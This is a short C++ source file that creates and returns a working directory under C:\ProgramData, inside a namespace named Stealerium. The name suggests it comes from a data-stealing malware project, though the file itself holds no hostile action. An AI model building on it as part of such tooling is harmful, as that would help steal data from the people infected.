#include "Paths.h"
#include <filesystem>
#include <stdexcept>

namespace fs = std::filesystem;

namespace Stealerium {
    std::string Paths::InitWorkDir() {
        std::string workDir = "C:\\ProgramData\\Stealerium";
        
        try {
            if (!fs::exists(workDir)) {
                if (!fs::create_directories(workDir)) {
                    throw std::runtime_error("Failed to create working directory");
                }
            }
        } catch (const fs::filesystem_error& e) {
            throw std::runtime_error("Filesystem error: " + std::string(e.what()));
        }

        return workDir;
    }
}